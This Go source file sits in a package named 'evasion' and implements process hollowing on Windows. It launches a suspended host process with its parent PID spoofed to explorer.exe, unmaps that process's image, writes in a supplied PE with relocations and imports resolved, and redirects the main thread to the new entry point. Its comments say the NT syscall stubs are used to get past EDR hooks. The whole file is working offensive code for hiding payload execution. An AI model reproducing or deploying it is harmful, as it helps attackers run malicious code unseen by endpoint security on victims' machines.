//go:build windows
// +build windows

package evasion

// HollowInject — classic process hollowing via NT syscall stubs.
//
// A suspended clone of hostExe is created (PPID-spoofed to explorer.exe),
// its original EXE image is unmapped, and the caller's PE blob is mapped in
// its place.  The main thread's RIP is redirected to the new entry point and
// then resumed.
//
// All cross-process reads and writes go through NtReadVirtualMemory /
// NtWriteVirtualMemory HGProc stubs, so EDR hooks on ReadProcessMemory /
// WriteProcessMemory are bypassed.
//
// Shared-ASLR assumption: Windows randomises system-DLL bases once per boot
// and identically for every process.  IAT slots are resolved from our own
// address space; those addresses are correct in the target as well.

import (
	"encoding/binary"
	"fmt"
	"runtime"
	"unsafe"

	"golang.org/x/sys/windows"
)

// HollowInject launches hostExe suspended, replaces its image with the PE in
// blob, and resumes the main thread.  Returns once the thread is running.
func HollowInject(blob []byte, hostExe string) error {
	if len(blob) < 0x40 {
		return fmt.Errorf("hollow: blob too small")
	}

	// ── Parse PE header ───────────────────────────────────────────────────
	lfanew := int(binary.LittleEndian.Uint32(blob[0x3C:]))
	if lfanew+0xF8 > len(blob) || blob[lfanew] != 'P' || blob[lfanew+1] != 'E' {
		return fmt.Errorf("hollow: not a valid PE")
	}
	coffBase := lfanew + 4
	numSections := int(binary.LittleEndian.Uint16(blob[coffBase+2:]))
	optHeaderSize := int(binary.LittleEndian.Uint16(blob[coffBase+16:]))
	optBase := coffBase + 20
	if binary.LittleEndian.Uint16(blob[optBase:]) != 0x020B {
		return fmt.Errorf("hollow: not PE32+ (x64)")
	}
	entryRVA := binary.LittleEndian.Uint32(blob[optBase+0x10:])
	prefBase := binary.LittleEndian.Uint64(blob[optBase+0x18:])
	imgSize := binary.LittleEndian.Uint32(blob[optBase+0x38:])
	hdrSize := binary.LittleEndian.Uint32(blob[optBase+0x3C:])
	sectionTableOff := optBase + optHeaderSize

	// ── Create suspended target (PPID → explorer.exe) ─────────────────────
	const createSuspended = 0x00000004
	spoof, _ := newPPIDSpoof("explorer.exe")
	if spoof != nil {
		defer spoof.close()
	}
	flags := uint32(createSuspended | windows.CREATE_NO_WINDOW)
	pi, err := createProcessSpoofed(hostExe, flags, spoof)
	if err != nil {
		return fmt.Errorf("hollow: create %q: %w", hostExe, err)
	}
	defer windows.CloseHandle(pi.Thread)
	defer windows.CloseHandle(pi.Process)
	proc := uintptr(pi.Process)

	// ── Read original ImageBase from remote PEB ────────────────────────────
	origBase := ProcessImageBase(proc)
	if origBase == 0 {
		return fmt.Errorf("hollow: cannot read remote PEB.ImageBase")
	}

	// ── Unmap original executable image ───────────────────────────────────
	NtUnmapViewOfSection(proc, origBase)

	// ── Allocate space for new image in target ─────────────────────────────
	newBase := NtAllocateVirtualMemory(proc, uintptr(imgSize), windows.PAGE_READWRITE)
	if newBase == 0 {
		return fmt.Errorf("hollow: NtAllocateVirtualMemory failed")
	}

	// ── Build staged image locally ─────────────────────────────────────────
	// Copy headers + sections into a local buffer, apply base relocations, and
	// resolve IAT — all relative to newBase.  Then write the finished image to
	// the target in a single NtWriteVirtualMemory call.
	//
	// Pin staged[0] with runtime.Pinner so the GC cannot move the slice backing
	// array while we hold a raw uintptr into it (stagedBase).
	staged := make([]byte, imgSize)
	var pinner runtime.Pinner
	pinner.Pin(&staged[0])
	defer pinner.Unpin()
	if int(hdrSize) <= len(blob) && int(hdrSize) <= len(staged) {
		copy(staged[:hdrSize], blob[:hdrSize])
	}
	for i := 0; i < numSections; i++ {
		off := sectionTableOff + i*40
		if off+40 > len(blob) {
			break
		}
		secVA := binary.LittleEndian.Uint32(blob[off+12:])
		rawSize := binary.LittleEndian.Uint32(blob[off+16:])
		rawOff := binary.LittleEndian.Uint32(blob[off+20:])
		if rawSize == 0 {
			continue
		}
		rawEnd := int(rawOff) + int(rawSize)
		if rawEnd > len(blob) || int(secVA)+int(rawSize) > len(staged) {
			continue
		}
		copy(staged[secVA:int(secVA)+int(rawSize)], blob[rawOff:rawEnd])
	}

	stagedBase := uintptr(unsafe.Pointer(&staged[0]))

	// Apply base relocations: patch 64-bit absolute pointers by delta.
	const baserelocOff = 0xB0
	if optBase+baserelocOff+8 <= len(blob) {
		relocRVA := binary.LittleEndian.Uint32(blob[optBase+baserelocOff:])
		relocSize := binary.LittleEndian.Uint32(blob[optBase+baserelocOff+4:])
		if relocRVA != 0 && relocSize != 0 {
			delta := int64(newBase) - int64(prefBase)
			if delta != 0 {
				applyRelocations(stagedBase, uintptr(relocRVA), uintptr(relocSize), uintptr(imgSize), delta)
			}
		}
	}

	// Resolve IAT from our address space (shared-ASLR assumption).
	const importOff = 0x78
	if optBase+importOff+8 <= len(blob) {
		importRVA := binary.LittleEndian.Uint32(blob[optBase+importOff:])
		importSize := binary.LittleEndian.Uint32(blob[optBase+importOff+4:])
		if importRVA != 0 && importSize != 0 {
			if err := resolveImports(stagedBase, uintptr(importRVA), uintptr(importSize), uintptr(imgSize)); err != nil {
				return fmt.Errorf("hollow: imports: %w", err)
			}
		}
	}

	// ── Write staged image into target ─────────────────────────────────────
	if !NtWriteRemote(proc, newBase, staged) {
		return fmt.Errorf("hollow: NtWriteRemote failed")
	}
	NtFlushRemote(proc, newBase, uintptr(imgSize))

	// Set per-section protections in target.
	for i := 0; i < numSections; i++ {
		off := sectionTableOff + i*40
		if off+40 > len(blob) {
			break
		}
		secVA := binary.LittleEndian.Uint32(blob[off+12:])
		secVS := binary.LittleEndian.Uint32(blob[off+8:])
		chars := binary.LittleEndian.Uint32(blob[off+36:])
		if secVS == 0 {
			secVS = binary.LittleEndian.Uint32(blob[off+16:])
		}
		if secVS == 0 {
			continue
		}
		NtProtectRemote(proc, newBase+uintptr(secVA), uintptr(secVS), sectionProtection(chars))
	}
	NtProtectRemote(proc, newBase, uintptr(hdrSize), windows.PAGE_READONLY)

	// ── Update PEB.ImageBase in target ─────────────────────────────────────
	pebAddr := ProcessPEB(proc)
	if pebAddr != 0 {
		var buf [8]byte
		for i := 0; i < 8; i++ {
			buf[i] = byte(newBase >> (uint(i) * 8))
		}
		NtWriteRemote(proc, pebAddr+0x10, buf[:])
	}

	// ── Set thread RIP → entry point ───────────────────────────────────────
	getCtx := getNtGetContextThreadProc()
	setCtx := getNtSetContextThreadProc()
	if getCtx == nil || setCtx == nil {
		return fmt.Errorf("hollow: context procs unavailable")
	}
	var ctx amd64Ctx
	*ctx.flagsPtr() = ctxControl
	if r, _, _ := getCtx.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx))); r != 0 {
		return fmt.Errorf("hollow: NtGetContextThread: %#x", r)
	}
	*ctx.ripPtr() = uint64(newBase + uintptr(entryRVA))
	if r, _, _ := setCtx.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx))); r != 0 {
		return fmt.Errorf("hollow: NtSetContextThread: %#x", r)
	}

	// ── Resume ─────────────────────────────────────────────────────────────
	resume := getNtResumeThreadProc()
	if resume == nil {
		return fmt.Errorf("hollow: NtResumeThread unavailable")
	}
	resume.Call(uintptr(pi.Thread), 0)
	return nil
}
